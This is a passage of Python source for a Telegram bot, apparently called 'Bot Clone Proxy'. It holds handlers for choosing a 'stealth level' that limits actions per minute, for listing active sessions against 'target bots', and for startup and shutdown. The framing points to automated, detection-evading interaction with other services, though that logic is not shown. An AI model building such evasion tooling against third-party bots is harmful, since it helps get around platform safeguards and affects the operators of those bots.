async def settings_menu(callback: CallbackQuery, state: FSMContext):
    """Show settings menu"""
    user_data = await state.get_data()
    current_level = user_data.get("stealth_level", "balanced")
    
    settings_text = (
        f"<b>⚙️ Settings</b>\n\n"
        f"<b>Current Configuration:</b>\n"
        f"• Stealth Level: {current_level.upper()}\n"
        f"• Max Actions/Min: {STEALTH_LEVELS[current_level]['max_actions_per_min']}\n\n"
        f"Select option:"
    )
    
    await callback.message.edit_text(
        settings_text,
        reply_markup=UIComponents.settings_menu(current_level)
    )
    await callback.answer()

@router.callback_query(F.data.startswith("stealth_"))
async def set_stealth_level(callback: CallbackQuery, state: FSMContext):
    """Set stealth level"""
    level = callback.data.split("_")[1]
    
    if level not in STEALTH_LEVELS:
        await callback.answer("Invalid level!", show_alert=True)
        return
    
    await state.update_data(stealth_level=level)
    user_settings[callback.from_user.id]["stealth_level"] = level
    
    if callback.from_user.id in user_stealth_engines:
        user_stealth_engines[callback.from_user.id] = StealthEngine(callback.from_user.id, level)
    
    await callback.answer(f"✅ Stealth level set to {level.upper()}")
    await settings_menu(callback, state)

@router.callback_query(F.data == "view_sessions")
async def view_active_sessions(callback: CallbackQuery):
    """View active sessions"""
    cursor = db.execute(
        """SELECT s.session_uuid, tb.username, s.start_time, s.interactions, s.stealth_level
           FROM sessions s
           JOIN target_bots tb ON s.target_bot_id = tb.id
           WHERE s.status = 'active' AND s.user_id = ?""",
        (callback.from_user.id,)
    )
    
    sessions = cursor.fetchall()
    
    if not sessions:
        text = "<b>📭 No active sessions</b>"
    else:
        text = "<b>🟢 Your Active Sessions</b>\n\n"
        for session in sessions[:5]:
            session_uuid, username, start_time, interactions, level = session
            try:
                start_str = datetime.fromisoformat(start_time).strftime('%H:%M:%S')
            except:
                start_str = start_time
            text += f"• @{username}\n  ├ Started: {start_str}\n  ├ Interactions: {interactions}\n  └ Level: {level}\n\n"
    
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text="🔙 Settings", callback_data="menu_settings"))
    
    await callback.message.edit_text(text, reply_markup=builder.as_markup())
    await callback.answer()

# ============================================================================
# MAIN FUNCTION
# ============================================================================

async def on_startup():
    """Startup tasks"""
    logger.info(f"🚀 Starting Bot Clone Proxy v{VERSION}")
    db._create_tables()
    logger.info("✅ Bot initialized")

async def on_shutdown():
    """Shutdown tasks"""
    logger.info("🛑 Shutting down...")
    
    for user_id, session in list(active_sessions.items()):
        try:
            db.end_session(session["session_uuid"])
        except:
            pass
    
    active_sessions.clear()
    db.close_all()
    logger.info("👋 Goodbye!")

def main():
    """Main entry point"""
    bot = Bot(
        token=BOT_TOKEN,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML)  # Changed to HTML
    )
    
    dp.include_router(router)
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)
    
    def signal_handler(sig, frame):
        logger.info("Shutting down...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        logger.info("🔄 Starting bot...")
        dp.run_polling(bot)
    except KeyboardInterrupt:
        logger.info("Stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
    finally:
        logger.info("Bot stopped")

if __name__ == "__main__":
    main()
